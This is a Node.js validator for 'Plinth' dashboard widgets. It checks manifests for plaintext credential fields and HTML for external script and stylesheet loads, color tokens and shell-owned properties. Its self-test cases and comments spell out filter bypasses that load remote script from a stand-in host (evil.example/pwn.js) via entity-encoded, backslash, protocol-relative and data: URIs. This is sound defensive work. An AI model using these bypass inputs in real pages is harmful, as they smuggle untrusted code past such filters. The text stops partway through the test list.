#!/usr/bin/env node
// Standards validator for Plinth widgets — the single validation boundary the
// build-widget skill, humans, and imports all share (see docs/WIDGET-STANDARD.md).
//
//   node tools/validate-widget.js widgets/clock           one widget, human output
//   node tools/validate-widget.js --all widgets           every widget, summary
//   node tools/validate-widget.js --json widgets/clock    machine-readable report
//
// Exit code 0 = no errors (warnings allowed), 1 = errors found or unreadable input.
// Every failure carries a stable rule id so automated repair loops can react.
'use strict';
const fs = require('fs');
const path = require('path');
const os = require('os');

const KNOWN_TYPES = new Set(['text', 'number', 'slider', 'color', 'select', 'switch',
  'secret', 'sensor', 'sensors-factory', 'location', 'list', 'media-selector']);
// Names that look like credentials: declaring them as free text writes a plaintext
// secret into layout.json, so the validator flags the type, not the widget author.
// camelCase and PascalCase count — `apiToken`, `clientSecret`, `githubPAT`, `APIToken`
// are the COMMON spellings, so the name is split at case boundaries before matching.
// The compound keywords tolerate the break the splitter introduces: "OAuthAPIKey"
// becomes "O Auth API Key", and "API Key" is still an api key.
// The trailing `s?` matters: `credential` was flagged and `credentials` was not, which
// the shared fixture caught. It cannot swallow the boundary cases — `passwordless`,
// `secretary` and `tokenizer` still fail, because after the optional s the next
// character must end the word.
const CREDENTIAL_WORD = /(^|[^a-z0-9])(token|secret|password|passwd|api ?key|bearer|pat|credential|private ?key|access ?key|authorization|auth ?header|jwt|pass ?phrase)s?([^a-z0-9]|$)/i;
// Credential-equivalent URLs (WIDGET-STANDARD: "a private ICS or webhook link"). A
// webhook URL IS the credential — anyone holding it can post. So is a private calendar
// address. But most url properties are public (the iframe and youtube widgets both
// ship one), so a bare url/link/endpoint is never enough on its own: it takes a
// secrecy qualifier, or webhook in a form that names the VALUE rather than
// configuration about it — `webhookUrl` and `slackWebhook` hold the secret;
// `webhookEnabled` and `webhookMethod` are a switch and a verb.
const WEBHOOK = /(^|[^a-z0-9])web ?hook([^a-z0-9]|$)/i;
const WEBHOOK_VALUE = /web ?hook$/i;
// All-lowercase compounds have no case boundary to split on and no word boundary to
// match, so `apitoken` and `clientsecret` slipped through the boundary-based rules
// entirely. These pairs are credential-bearing with no plausible innocent reading.
// Anchored at the END: unanchored, `userKeyboardLayout` squashes to
// `userkeyboardlayout` and matches `userkey`, failing a keyboard-layout select.
const COMPOUND = /(api|client|access|auth|refresh|session|bearer|private|user|admin|service|oauth)(token|secret|key|password|passwd)s?$/i;
// ...but the anchor only earns that when the name HAS a boundary to reason about.
// `apiTokenValue` splits to "api Token Value" and CREDENTIAL_WORD catches the standalone
// "Token"; `apitokenvalue` splits to nothing, so the anchored rule sees a compound in
// the middle and waves it through — a plaintext token in layout.json (issue #107).
// For an all-lowercase run there is no honest way to tell `apitokenvalue` from
// `userkeyboardlayout` without a dictionary, so around credentials the ambiguous name
// is refused: an author who means the keyboard one writes `userKeyboardLayout`, which
// is the spelling the rest of this rule is built around anyway.
const COMPOUND_ANYWHERE = /(api|client|access|auth|refresh|session|bearer|private|user|admin|service|oauth)(token|secret|key|password|passwd)s?/i;
// A SINGLE case run, upper or lower — not merely "letters and digits". APITOKENVALUE
// carries no word boundary either, so it is exactly as ambiguous as apitokenvalue and
// belongs here. But an /i flag would also match userKeyboardLayout, whose camelCase IS
// the boundary this rule is defined by absence of; the shared fixture caught that on the
// first run. Two anchored alternatives say what is meant: no case change anywhere.
const UNSTRUCTURED = /^([a-z0-9]+|[A-Z0-9]+)$/;
// A url/link/endpoint is the credential only when the name denotes the VALUE. Same
// distinction the webhook rule makes: `privateIcsUrl` holds it, `signedUrlExpiry`
// holds a duration and `personalLinkLabel` holds a caption.
const URL_VALUE = /(url|uri|link|endpoint|address|feed)$/i;
const URLISH = /(^|[^a-z0-9])(url|uri|link|endpoint|address|feed)([^a-z0-9]|$)/i;
const SECRET_QUALIFIER = /(^|[^a-z0-9])(private|secret|signed|personal|sas)([^a-z0-9]|$)/i;
// A name ENDING in one of these describes something ABOUT a credential rather than
// holding one: `tokenEndpoint` is a public OAuth URL, `tokenExpiry` a duration,
// `accessTokenType` a string like "Bearer". Without this an ordinary OAuth widget is
// refused outright unless it declares a public URL as `secret`, which would be a lie.
// Only the credential-WORD rules are waived — the webhook and signed-URL rules still
// run below, because `webhookEndpoint` genuinely IS the credential.
// Deliberately tight: every entry must be a word that cannot itself hold the secret.
// `value`, `url` and `name` are absent for that reason — `tokenValue` and `secretUrl`
// stay flagged.
const METADATA_TAIL = /(^|[^a-z0-9])(endpoints?|expiry|expires|expiration|ttl|lifetime|type|label|format|algorithm|issuer|scopes?|count|prefix|enabled)$/i;
const looksLikeCredential = (name) => {
  // Two case boundaries, because initialisms are everywhere in this domain:
  //   acronym->word  "APIToken" -> "API Token", "JWTToken" -> "JWT Token"
  //   word->Word     "apiToken" -> "api Token", "githubPAT" -> "github PAT"
  // Separators join in ("access_key" -> "access key"), and the squashed form is tried
  // too so a two-word spelling of a one-word keyword ("access key" -> "accesskey")
  // still matches. Word boundaries keep the squashed pass honest: "compatMode" ->
  // "compatmode" does NOT match "pat", and "PATH" -> "path" does not either.
  const spaced = String(name || '')
    .replace(/([A-Z]+)([A-Z][a-z])/g, '$1 $2')
    .replace(/([a-z0-9])([A-Z])/g, '$1 $2')
    .replace(/[_\-.]+/g, ' ');
  const squashed = spaced.replace(/\s+/g, '');
  const trimmed = spaced.trim();
  // Metadata about a credential is not the credential; see METADATA_TAIL.
  if (!METADATA_TAIL.test(trimmed)) {
    if (CREDENTIAL_WORD.test(spaced) || CREDENTIAL_WORD.test(squashed)) return true;
    if (COMPOUND.test(squashed)) return true;
    if (UNSTRUCTURED.test(String(name || '')) && COMPOUND_ANYWHERE.test(squashed)) return true;
  }
  if (WEBHOOK.test(spaced) && (URLISH.test(spaced) || WEBHOOK_VALUE.test(trimmed))) return true;
  return URLISH.test(spaced) && SECRET_QUALIFIER.test(spaced) && URL_VALUE.test(trimmed);
};
// One attribute reader for every rule below, because the rules that rolled their own
// each missed a different legal spelling. An attribute starts at whitespace or the
// self-closing slash — NOT at any word boundary, or `data-rel` and `aria-rel` read as
// `rel` and a stylesheet slips past the ordering rule (issue #121). Values may be
// double-quoted, single-quoted, or unquoted: all three are valid HTML, and only the
// first two were being matched. Returns null when the attribute is absent, so callers
// can tell that apart from an empty value.
// Attribute values are decoded before they mean anything. `src="&#47;&#47;evil.example/x"`
// is loaded by a browser as `//evil.example/x`, so a rule reading the raw text sees no
// scheme and no `//` and waves it through — the guard has to look at the value the
// BROWSER will act on, not the bytes in the file.
const CHAR_REFS = { amp: '&', lt: '<', gt: '>', quot: '"', apos: "'", nbsp: '\u00a0',
  sol: '/', bsol: '\\', colon: ':', tab: '\t', newline: '\n', period: '.', num: '#', quest: '?' };
const decodeEntities = (s) => String(s).replace(/&(#[xX][0-9a-fA-F]+|#\d+|[a-zA-Z][a-zA-Z0-9]*);?/g, (whole, body) => {
  if (body[0] === '#') {
    const code = body[1] === 'x' || body[1] === 'X'
      ? parseInt(body.slice(2), 16) : parseInt(body.slice(1), 10);
    return Number.isFinite(code) && code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : whole;
  }
  const named = CHAR_REFS[body.toLowerCase()];
  return named === undefined ? whole : named;
});
// Attributes are TOKENIZED rather than searched for. A regex scanning the whole tag has
// no idea where one attribute ends and the next begins, so
//   <script data-doc="example src=//cdn.example/x.js">
// reads as if the element had a src — an inline script that fetches nothing, refused.
// Walking the tag once, honouring quotes, is both shorter to reason about and the only
// way the answer can be right for markup nobody thought to predict.
// Finding where a start tag ENDS needs the same quote awareness as parsing it. A `>`
// inside a quoted value is ordinary text to a browser, so `[^>]*>` truncates
//   <script data-note=">" src="//evil.example/pwn.js">
// to `<script data-note=">` — no src in sight, widget accepted, remote script loaded.
// Fixing the attribute parser and leaving the tag scanner naive fixes one layer of a
// two-layer problem, which is what happened in the round before this one.
function startTags(html, tagName) {
  const out = [];
  const opener = new RegExp('<' + tagName + '(?=[\\s/>])', 'gi');
  let m;
  while ((m = opener.exec(html)) !== null) {
    let i = m.index + m[0].length;
    let quote = null;
    while (i < html.length) {
      const c = html[i];
      if (quote) { if (c === quote) quote = null; }
      else if (c === '"' || c === "'") quote = c;
      else if (c === '>') break;
      i++;
    }
    out.push({ tag: html.slice(m.index, Math.min(i + 1, html.length)), index: m.index });
    opener.lastIndex = Math.min(i + 1, html.length);
  }
  return out;
}

function tagAttributes(tag) {
  const attrs = new Map();
  // Past `<` and the tag name; everything after is attributes until the closing `>`.
  let i = 1;
  while (i < tag.length && /[^\s/>]/.test(tag[i])) i++;
  while (i < tag.length) {
    while (i < tag.length && /[\s/]/.test(tag[i])) i++;
    if (i >= tag.length || tag[i] === '>') break;
    const start = i;
    while (i < tag.length && /[^\s=/>]/.test(tag[i])) i++;
    const name = tag.slice(start, i).toLowerCase();
    if (!name) { i++; continue; }
    while (i < tag.length && /\s/.test(tag[i])) i++;
    let value = '';
    if (tag[i] === '=') {
      i++;
      while (i < tag.length && /\s/.test(tag[i])) i++;
      const quote = tag[i];
      if (quote === '"' || quote === "'") {
        const end = tag.indexOf(quote, ++i);
        value = end < 0 ? tag.slice(i) : tag.slice(i, end);
        i = end < 0 ? tag.length : end + 1;
      } else {
        const vs = i;
        while (i < tag.length && /[^\s>]/.test(tag[i])) i++;
        value = tag.slice(vs, i);
      }
    }
    if (!attrs.has(name)) attrs.set(name, decodeEntities(value));   // first wins, as HTML does
  }
  return attrs;
}
const attr = (tag, name) => {
  const v = tagAttributes(tag).get(name.toLowerCase());
  return v === undefined ? null : v;
};
const APP_PREFIX = 'https://app.plinth/';
// External = anything carrying a scheme or protocol-relative authority that is not the
// shell's own origin. A plain relative path stays inside the widget's virtual host and
// is always fine. Whitespace inside the value counts as padding, not as content: a
// browser strips leading and trailing space (and tabs and newlines) before resolving.
// A named reference this table does not know is a value we cannot predict the browser's
// reading of — `&bsol;` is a backslash to HTML and was invisible here. The table will
// always be partial (the real set runs to thousands), so completeness is the wrong goal:
// an UNRESOLVED reference in a src/href is refused instead. That is complete by
// construction, and costs a widget author nothing, since the literal character is always
// available and a legitimate `&` in a query string is written `&amp;`, which does decode.
const UNRESOLVED_REF = /&(#[xX]?[0-9a-fA-F]+|[a-zA-Z][a-zA-Z0-9]*);/;
const isExternalRef = (value, { allowData = false } = {}) => {
  // Backslashes are slashes to a URL parser on a special scheme, so `\\evil.example/x`
  // resolves against an https base to `https://evil.example/x` — a bypass that looks like
  // neither a scheme nor a `//` until the browser normalizes it. Classify what the
  // browser will act on.
  const s = String(value || '').replace(/[\s\u0000]+/g, '').replace(/\\/g, '/').trim();
  if (!s || s.startsWith(APP_PREFIX)) return false;
  // A data: URI carries its own bytes, so for a LINK it is self-contained by definition —
  // a packaged data-URI icon fetches nothing. Never passed for <script>, where the bytes
  // are code and executing attacker-chosen code is the whole point of the rule.
  if (allowData && /^data:/i.test(s)) return false;
  // Still carrying a reference the decoder did not resolve: treat as external rather
  // than guess. See UNRESOLVED_REF.
  if (UNRESOLVED_REF.test(s)) return true;
  return s.startsWith('//') || /^[a-z][a-z0-9+.-]*:/i.test(s);
};
// Link relations whose target is displayed, never executed or followed for more
// content. Everything else — stylesheet, preload, modulepreload, prefetch, prerender,
// anything unrecognized — can pull further resources, so a data: URI in one of those is
// not self-contained no matter that its own bytes are inline.
const INERT_LINK_RELS = new Set(['icon', 'shortcut', 'apple-touch-icon',
  'apple-touch-icon-precomposed', 'mask-icon', 'fluid-icon']);
const KNOWN_SLOTS = new Set(['quarter', 'half', 'three-quarter', 'full']);
const LIST_FIELD_TYPES = new Set(['text', 'color']);
// Labels must never teach a syntax — structured values use the list type.
const SYNTAX_IN_LABEL = /comma[ -]?separated|semicolon|delimited|one per line|json|\w+=\w+/i;

function validate(folder) {
  const report = { folder, ok: true, errors: [], warnings: [], externalHosts: [] };
  const err = (rule, detail) => { report.ok = false; report.errors.push({ rule, detail }); };
  const warn = (rule, detail) => { report.warnings.push({ rule, detail }); };

  // ---- manifest -----------------------------------------------------------------
  const manifestPath = path.join(folder, 'manifest.json');
  let manifest;
  try {
    manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
  } catch (e) {
    err('manifest-parse', manifestPath + ': ' + e.message);
    return report;
  }

  if (!/^[a-z0-9]+(\.[a-z0-9-]+)+$/.test(manifest.id || ''))
    err('manifest-id', `id "${manifest.id}" must be reverse-DNS, lowercase (e.g. com.example.my-widget)`);
  for (const key of ['name', 'author', 'description'])
    if (typeof manifest[key] !== 'string' || !manifest[key].trim())
      err('manifest-' + key, `"${key}" is required`);
  if (!/^\d+\.\d+\.\d+([-+].+)?$/.test(manifest.version || ''))
    err('manifest-version', `version "${manifest.version}" must be semver (x.y.z)`);
  if (typeof manifest.min_api_version !== 'number')
    err('manifest-api', 'min_api_version (number) is required');
  const slots = manifest.supported_slots;
  if (!Array.isArray(slots) || !slots.length)
    err('manifest-slots', 'supported_slots must be a non-empty array');
  else for (const s of slots)
    if (!KNOWN_SLOTS.has(s)) err('manifest-slots', `unknown slot "${s}"`);

  for (const prop of manifest.properties || []) {
    const where = `property "${prop.name || '?'}"`;
    if (!prop.name) err('prop-name', 'a property is missing "name"');
    const type = prop.type || 'text';
    if (!KNOWN_TYPES.has(type)) err('prop-type', `${where}: unknown type "${type}"`);
    if (SYNTAX_IN_LABEL.test(prop.label || ''))
      err('prop-label-syntax', `${where}: label "${prop.label}" teaches a syntax — use type "list" (or a better label); users never type delimited data`);
    // Credentials MUST be type "secret": that is the only type the host encrypts
    // (DPAPI, CurrentUser) before writing layout.json. As "text" the token sits on
    // disk in the clear and rides any layout copy off the machine.
    if (type !== 'secret' && looksLikeCredential(prop.name))
      err('prop-secret', `${where}: a credential must use type "secret" (the host encrypts those with DPAPI); "${type}" stores it as plaintext in layout.json`);
    if (type === 'secret' && prop.default != null && String(prop.default) !== '')
      err('prop-secret-default', `${where}: a secret must not ship a default value`);
    // A secret is the one field a user cannot guess, cannot see once stored, and cannot
    // get wrong quietly — the value has to be fetched from some other product's UI. The
    // placeholder is not the place to say how: it disappears on the first keystroke and is
    // clipped to the control width, which is how "read access to the repos above" ended up
    // being all the guidance a GitHub token got (#207). `help` persists under the control.
    // Typed, not merely truthy. `String({})` is "[object Object]" — non-empty, so a
    // help-shaped object would satisfy the rule below, render as that literal in both
    // editors, and then fail the C# projection outright: Help is a `string`, so
    // System.Text.Json throws on the object and the whole manifest is skipped on scan
    // and refused on install. The validator must not greenlight what the host cannot load.
    if (prop.help != null && typeof prop.help !== 'string')
      err('prop-help-type', `${where}: "help" must be a string (got ${Array.isArray(prop.help) ? 'array' : typeof prop.help}) — the host reads it into a string field and refuses the whole manifest otherwise`);
    if (type === 'secret' && !(typeof prop.help === 'string' && prop.help.trim()))
      err('prop-secret-help', `${where}: a secret needs "help" saying where the value comes from and what access it needs — a placeholder cannot, it vanishes as soon as the user types`);
    if (type === 'select' && !Array.isArray(prop.options) && !prop.optionsSource)
      err('prop-select', `${where}: select needs "options" or "optionsSource"`);
    if (type === 'slider' && (typeof prop.min !== 'number' || typeof prop.max !== 'number'))
      err('prop-slider', `${where}: slider needs numeric min/max`);
    if (type === 'list') {
      if (!Array.isArray(prop.fields) || !prop.fields.length)
        err('prop-list', `${where}: list needs a "fields" array`);
      else for (const f of prop.fields) {
        if (!f.key) err('prop-list', `${where}: a list field is missing "key"`);
        // There is no encrypted list field: the host seals only top-level `secret`
        // properties, so a credential inside a list row lands in layout.json as
        // plaintext no matter what the outer property is called.
        if (f.key && looksLikeCredential(f.key))
          err('prop-secret', `${where}: list field "${f.key}" looks like a credential, and list rows are NEVER encrypted — give the widget a top-level "secret" property instead`);
        if (!LIST_FIELD_TYPES.has(f.type || 'text'))
          err('prop-list', `${where}: list field type "${f.type}" not supported (text | color)`);
      }
    }
  }

  // ---- index.html ---------------------------------------------------------------
  const htmlPath = path.join(folder, 'index.html');
  let html;
  try {
    html = fs.readFileSync(htmlPath, 'utf8');
  } catch (e) {
    err('html-missing', 'index.html is required');
    return report;
  }

  // The foundation stylesheet, linked before any widget CSS.
  const baseIdx = html.indexOf('https://app.plinth/widget-base.css');
  if (baseIdx < 0) {
    err('base-css', 'index.html must link https://app.plinth/widget-base.css (first, in <head>)');
  } else {
    // The foundation must be the FIRST stylesheet of any kind — a linked local
    // stylesheet before it would override base layout just like an inline <style>.
    // The rel VALUE is parsed to its attribute boundary (quotes or whitespace) and
    // token-matched, so a preload whose filename merely contains "stylesheet"
    // (rel=preload href=stylesheet.css) cannot false-positive.
    let firstOther = html.search(/<style[\s>]/i);
    for (const m of startTags(html, 'link')) {
      if (m.tag.includes('widget-base.css')) continue;
      const value = attr(m.tag, 'rel') || '';
      if (!value.toLowerCase().split(/\s+/).includes('stylesheet')) continue;
      if (firstOther < 0 || m.index < firstOther) firstOther = m.index;
    }
    if (firstOther >= 0 && firstOther < baseIdx)
      err('base-css-order', 'widget-base.css must be the FIRST stylesheet — before any <style> or <link rel="stylesheet">');
  }

  // Tokens, never literal colors: hex colors inside <style> are the tell. Pure
  // black/white are allowed only for shadow/scrim alphas via rgba() — flagged
  // separately below.
  const styleBlocks = [...html.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/gi)].map((m) => m[1]).join('\n');
  const noComments = styleBlocks.replace(/\/\*[\s\S]*?\*\//g, '');
  for (const m of noComments.matchAll(/#[0-9a-fA-F]{3,8}\b/g)) {
    err('hardcoded-color', `hex literal ${m[0]} in <style> — use a design token (var(--…)); see WIDGET-STANDARD §1`);
  }
  for (const m of noComments.matchAll(/rgba?\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)/g)) {
    const [r, g, b] = [Number(m[1]), Number(m[2]), Number(m[3])];
    const mono = r === g && g === b && (r === 0 || r === 255);
    if (!mono)
      err('hardcoded-color', `literal ${m[0]}…) in <style> — compose from tokens (rgba(var(--surface-rgb), …)) instead`);
  }

  // Self-contained: no external scripts or stylesheets (embeds/iframes and data
  // fetches are widget business; script execution from third parties is not).
  //
  // Stated as what is ALLOWED, not as what is forbidden. The forbidden list only ever
  // covered the shapes someone thought of: `//evil.example/pwn.js` is not `http://`, so
  // it passed — and a browser resolves it against the widget's own https virtual host,
  // which is precisely the fetch the rule exists to stop (issue #110). Same for `data:`,
  // `blob:`, an uppercase scheme, or a value padded with whitespace. Anything that is
  // not app.plinth and not a plain relative path is external, whatever it looks like.
  // Every rule below classifies an ATTRIBUTE, and an attribute is only half of a URL —
  // the document base is the other half. `<base href="//evil.example/">` turns every
  // relative reference in the file remote without any of them looking it, so the
  // hardening in #110/#121 (protocol-relative, unquoted, entities, backslashes, tag
  // boundaries) all reads the wrong side of the resolution (issue #124).
  //
  // Refused rather than resolved-against. A self-contained widget has no reason to
  // retarget its own base, so refusing an external one costs nothing and restores the
  // premise every other rule depends on: relative really means relative. A RELATIVE base
  // stays inside the widget's own origin and cannot reach remote code, so it is allowed.
  for (const m of startTags(html, 'base')) {
    const href = attr(m.tag, 'href');
    if (href !== null && isExternalRef(href))
      err('external-base', `external <base href="${href}"> — it would resolve every relative reference in this widget against another origin`);
  }
  for (const m of startTags(html, 'script')) {
    const src = attr(m.tag, 'src');
    if (src !== null && isExternalRef(src))
      err('external-script', `external <script src="${src}"> — widgets must be self-contained (only app.plinth scripts allowed)`);
  }
  for (const m of startTags(html, 'link')) {
    const href = attr(m.tag, 'href');
    if (href === null) continue;
    // Checked for EVERY rel, not just stylesheet: rel=preload / modulepreload / prefetch
    // fetch remote content just as effectively, and a rule that only reads stylesheets
    // would hand them a way through.
    //
    // The data: exemption is narrower than the loop, and the two used to contradict each
    // other (#125). A data: icon is inert bytes; `data:text/css,@import url(...)` is a
    // stylesheet the browser EVALUATES, and it fetches whatever it names. So the
    // exemption is an allow-list of relations that cannot pull anything further, and an
    // unrecognized rel counts as fetching — the failure direction should be refusal, the
    // same reasoning as the external-reference rule itself.
    const rels = (attr(m.tag, 'rel') || '').toLowerCase().split(/\s+/).filter(Boolean);
    const inert = rels.length > 0 && rels.every((r) => INERT_LINK_RELS.has(r));
    if (isExternalRef(href, { allowData: inert }))
      err('external-style', `external <link href="${href}"> — widgets must be self-contained`);
  }

  // Informational: which external hosts the widget's code mentions.
  const hostSet = new Set();
  for (const m of html.matchAll(/https?:\/\/([a-z0-9.-]+\.[a-z]{2,})/gi)) {
    const host = m[1].toLowerCase();
    if (!host.endsWith('.plinth') && host !== 'app.plinth') hostSet.add(host);
  }
  report.externalHosts = [...hostSet].sort();

  // Dangerous sinks.
  if (/\beval\s*\(|new\s+Function\s*\(/.test(html))
    err('eval', 'eval() / new Function() are banned');
  if (/setInterval\s*\([^)]*,\s*([0-9]{1,2})\s*\)/.test(html))
    warn('fast-timer', 'setInterval under 100ms — this runs 24/7 on the panel; batch or slow it down');

  // Appearance the SHELL owns. These are facts about the tile, not about what a widget
  // displays, so the panel declares them and widget-api.js applies them inside the frame —
  // see Shell/appearance.js. This rule used to be the opposite: it REQUIRED every widget
  // that declared bgStyle to map it by hand, which is how 31 identical declarations and
  // two different hand-written spellings of the same three lines came to exist.
  //
  // Declaring one is an error rather than a warning because a declaration is not merely
  // redundant — the shell drops it, so the author would be looking at a control in their
  // manifest that has no effect on anything, which is worse than not having written it.
  // The panel's property names. Kept in step with Shell/appearance.js by hand — this file
  // is Node and that one is a browser IIFE, and a require() shim across that boundary buys
  // less than it costs for a one-entry list.
  const SHELL_OWNED = ['bgStyle'];

  // A widget may declare properties in the MANIFEST or, for iCUE-compatible packages, in
  // <meta name="x-icue-property"> tags — IcueManifestReader parses those when the manifest
  // list is empty, so a package can declare a shell-owned name down the supported iCUE path
  // and be just as wrong there. Checking only the manifest would enforce the contract for
  // widgets written here and exempt exactly the imported ones it exists to protect against.
  const icueNames = startTags(html, 'meta')
    .filter((m) => (attr(m.tag, 'name') || '').toLowerCase() === 'x-icue-property')
    .map((m) => String(attr(m.tag, 'content') || '').split(/[;,]/)[0].trim())
    .filter(Boolean);
  const declaredNames = (manifest.properties || []).map((p) => p && p.name).filter(Boolean)
    .concat(icueNames);
  for (const name of SHELL_OWNED) {
    if (declaredNames.some((n) => n === name))
      err('shell-owned-property', `"${name}" is supplied by the panel for every widget — remove it from the manifest (the shell ignores a declared one, so it would render as a dead control)`);
  }

  // Applying the classes by hand fights the shell. Not merely duplicated work: widget-api
  // applies these at init, so a widget that also sets them races the panel and wins or
  // loses on callback order.
  //
  // Read from SCRIPT bodies, not from `noComments` — that one holds the <style> blocks and
  // nothing else, so a JS pattern tested against it can never match and the rule would pass
  // for every widget including the broken ones. Comments are stripped so the prose in a
  // header block explaining that the panel owns this cannot trip the rule enforcing it.
  //
  // LOCAL script files are read too. Only EXTERNAL script srcs are refused by this
  // validator, so `<script src="helper.js">` is a supported shape and one stock widget
  // already uses it — scanning inline bodies alone would leave the contract unenforced for
  // exactly the packaging that hides it best. Resolved inside the widget folder and read
  // best-effort: an unreadable helper is the packaging rules' business, not this rule's.
  const stripComments = (js) => js
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/(^|[^:])\/\/[^\n]*/g, '$1');
  let scriptJs = [...html.matchAll(/<script\b[^>]*>([\s\S]*?)<\/script>/gi)].map((m) => m[1]).join('\n');
  for (const m of startTags(html, 'script')) {
    const src = attr(m.tag, 'src');
    if (!src || isExternalRef(src)) continue;
    const root = path.resolve(folder);
    const file = path.resolve(root, decodeURIComponent(src.split(/[?#]/)[0]).replace(/^\/+/, ''));
    if (file !== root && !file.startsWith(root + path.sep)) continue;   // no walking out
    try { scriptJs += '\n' + fs.readFileSync(file, 'utf8'); } catch (e) { /* unreadable: not this rule's business */ }
  }
  scriptJs = stripComments(scriptJs);

  // A COMPLETE class token, not a substring. `bg-solid` sits inside both `bg-solid-ish`
  // and `my-bg-solid`; neither is a class the panel owns, and flagging either blocks a
  // valid widget. Both ends are bounded for that reason — the trailing one was added first
  // and the leading one was still missing, which is the same mistake twice.
  const BG_TOKEN = '(?<![\\w-])bg-(?:solid|glass|transparent)(?![\\w-])';
  const BG_CLASS = new RegExp(BG_TOKEN);
  const selfApplied = [
    new RegExp('classList\\s*\\.\\s*(?:toggle|add|remove|replace)\\s*\\([^)]*' + BG_TOKEN),
    new RegExp('className\\s*(?:=|\\+=)[^;\\n]*' + BG_TOKEN),
    new RegExp('setAttribute\\s*\\(\\s*[\'"]class[\'"][^)]*' + BG_TOKEN),
  ].some((re) => re.test(scriptJs));
  if (selfApplied)
    err('bgstyle-selfapplied', 'the widget sets its own bg-* classes — widget-api.js applies the panel\'s background style; remove the local handling');

  // ...and statically, in the markup. `<body class="bg-solid">` is less a race than a lie:
  // it paints one frame of a tile the panel may not have asked for, and it is the widget
  // claiming a class it does not own.
  //
  // Parsed with the real attribute reader rather than sliced with a regex. `<body[^>]*>`
  // ends at the first `>` ANYWHERE, including one inside a quoted value, so
  // `<body data-note=">" class="bg-solid">` hands the check a fragment with no class in it
  // and the rule passes on markup a browser renders with the class applied. tagAttributes
  // already handles quoted delimiters and entity-decoding; the shortcut existed only
  // because I did not look for it.
  const bodyClass = startTags(html, 'body').map((m) => attr(m.tag, 'class') || '').join(' ');
  if (BG_CLASS.test(bodyClass))
    err('bgstyle-static', 'the <body> tag hard-codes a bg-* class — the panel owns the background style; remove it from the markup');

  // Reduced motion: infinite animations should freeze under prefers-reduced-motion.
  if (/animation[^;]*infinite/.test(noComments) && !/prefers-reduced-motion/.test(noComments))
    warn('reduced-motion', 'infinite animation without a prefers-reduced-motion guard (widget-base.css covers its own classes only)');

  return report;
}

function human(report) {
  const lines = [`${report.ok ? 'OK  ' : 'FAIL'} ${report.folder}`];
  for (const e of report.errors) lines.push(`  ERROR   [${e.rule}] ${e.detail}`);
  for (const w of report.warnings) lines.push(`  warning [${w.rule}] ${w.detail}`);
  if (report.externalHosts.length) lines.push(`  external hosts: ${report.externalHosts.join(', ')}`);
  return lines.join('\n');
}

// ---- CLI ------------------------------------------------------------------------
const args = process.argv.slice(2);
const asJson = args.includes('--json');
const all = args.includes('--all');

// --self-test runs the shared fixture through looksLikeCredential. The same file is
// read by the C# port at the install boundary (issue #57), and CI runs both: that is
// the only thing stopping the two from drifting into "the validator refuses this
// widget but the host installs it anyway".
if (args.includes('--self-test')) {
  const fixture = JSON.parse(fs.readFileSync(path.join(__dirname, 'credential-names.json'), 'utf8'));
  let bad = 0;
  for (const name of fixture.credential) {
    if (!looksLikeCredential(name)) { console.log(`  FAIL credential "${name}" was NOT flagged`); bad++; }
  }
  for (const name of fixture.innocent) {
    if (looksLikeCredential(name)) { console.log(`  FAIL innocent "${name}" WAS flagged`); bad++; }
  }
  const total = fixture.credential.length + fixture.innocent.length;
  console.log(bad
    ? `${bad} of ${total} disagree with tools/credential-names.json`
    : `credential rule agrees with the fixture on all ${total} names`);

  // The HTML rules get the same treatment, because both of the ways they leaked were
  // spellings nobody had written down: a browser-legal shape the regex did not model
  // (issues #110, #121). The CLEAN case is not decoration — it is what fails first if
  // one of these rules is tightened into refusing ordinary widgets.
  const BASE = '<link rel="stylesheet" href="https://app.plinth/widget-base.css">';
  const doc = (head) => `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<title>T</title>${head}<style>body { color: var(--text); }</style></head>
<body><script src="https://app.plinth/widget-api.js"></script></body></html>`;
  const htmlCases = [
    ['clean', doc(BASE), null],
    // #121 — \b matches after a hyphen, so data-rel was read as the real rel and the
    // stylesheet ahead of the base went unseen.
    ['rel-after-data-rel', doc('<link data-rel="preload" rel="stylesheet" href="local.css">' + BASE), 'base-css-order'],
    // #110 — none of these are `http://`, and all four load remote script in a browser.
    ['protocol-relative', doc(BASE + '<script src="//evil.example/pwn.js"></script>'), 'external-script'],
    ['unquoted-attribute', doc(BASE + '<script src=https://evil.example/pwn.js></script>'), 'external-script'],
    ['uppercase-scheme', doc(BASE + '<script src="HTTPS://evil.example/pwn.js"></script>'), 'external-script'],
    ['data-uri', doc(BASE + '<script src="data:text/javascript,alert(1)"></script>'), 'external-script'],
    ['external-stylesheet', doc(BASE + '<link rel="stylesheet" href="//evil.example/x.css">'), 'external-style'],
    // A browser DECODES the attribute before resolving it, so a rule reading raw text
    // sees no scheme and no // and lets the remote script through.
    ['entity-encoded-slashes', doc(BASE + '<script src="&#47;&#47;evil.example/pwn.js"></script>'), 'external-script'],
    ['entity-encoded-scheme', doc(BASE + '<script src="&#104;ttps://evil.example/pwn.js"></script>'), 'external-script'],
    ['entity-hex-encoded', doc(BASE + '<script src="&#x2f;&#x2f;evil.example/pwn.js"></script>'), 'external-script'],
    // rel=preload fetches remote content as surely as a stylesheet does, so the link
    // rule cannot be narrowed to rel=stylesheet.
    ['preload-remote', doc(BASE + '<link rel="preload" as="script" href="//evil.example/x.js">'), 'external-style'],
    // ...while a packaged data: URI fetches nothing and must stay accepted. Inert bytes
    // in a link are self-contained; the same scheme on a <script> is code, and stays out.
    ['data-uri-icon', doc(BASE + '<link rel="icon" href="data:image/png;base64,iVBORw0KGgo=">'), null],
    // A URL parser treats backslashes as slashes on a special scheme, so this resolves
    // against the widget's https base to https://evil.example/pwn.js.
    ['entity-backslashes', doc(BASE + '<script src="&#92;&#92;evil.example/pwn.js"></script>'), 'external-script'],
    ['literal-backslashes', doc(BASE + '<script src="\\\\evil.example/pwn.js"></script>'), 'external-script'],
    // ...and the other direction: text INSIDE another attribute is not this element's
    // src. An inline script fetches nothing and must not be reported as external.
    ['lookalike-attribute', doc(BASE + '<script data-doc="example src=//cdn.example/x.js">var a=1;</script>'), null],
    ['lookalike-href-attribute', doc(BASE + '<link rel="icon" data-note="href=//evil.example/x" href="icon.png">'), null],
    // A `>` inside a quoted value is text to a browser; a naive `[^>]*>` scan truncates
    // the tag right there and never sees the src that follows.
